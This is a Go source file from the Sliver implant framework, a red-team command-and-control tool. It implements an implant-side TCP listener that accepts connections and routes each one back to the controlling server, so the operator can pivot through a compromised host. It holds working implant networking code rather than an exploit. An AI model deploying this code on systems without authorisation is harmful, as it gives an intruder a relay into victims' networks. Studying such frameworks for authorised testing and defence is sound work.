package comm

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"fmt"
	"net"

	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// ListenTCP - The implant is requested to start a TCP handler and return the connection
// to the server, with the handler information passed in. This connection can be wrapped
// into a tls.Conn, a SMTP one, etc, by the server, without the implant knowing anything about it.
func ListenTCP(handler *sliverpb.Handler) (ln net.Listener, err error) {
	// {{if .Config.Debug}}
	log.Printf("Starting Raw TCP listener on %s:%d", handler.LHost, handler.LPort)
	// {{end}}
	ln, err = net.Listen("tcp", fmt.Sprintf("%s:%d", handler.LHost, handler.LPort))
	if err != nil {
		return nil, err
	}

	// Add listener to jobs
	listener := newStreamListener(handler, ln)
	Listeners.Add(listener)

	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				// We should return an error to the server.

				// If err is closed listener, return
				return
			}

			// For each connection, route back to the server.
			go Comms.server.handleReverse(handler, conn)
		}
	}()

	return
}
